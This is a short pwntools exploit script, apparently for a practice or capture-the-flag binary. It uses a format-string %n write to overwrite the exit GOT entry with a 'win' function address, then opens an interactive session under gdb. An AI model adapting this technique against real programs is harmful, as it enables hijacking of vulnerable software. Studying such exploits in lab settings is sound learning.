#!/usr/bin/env python3

from pwn import *
from pwnlib.util.packing import p64

def main():
    p = process('./a.out')

    buf_pos = 10
    func_win = 0x401162
    got_exit = 0x404038
    got_plt = 0x401076

    fmt_str = f'%{func_win-2}cAA%{buf_pos}$n'
    fmt_str += ' '*(32-len(fmt_str)) 

    fmt_str = fmt_str.encode('utf-8') + p64(got_exit)
    
    log.info(str(fmt_str))

    gdb.attach(p)
    p.sendline(fmt_str)
    p.recvuntil('AA')

    p.interactive()

if __name__ == '__main__':
    main()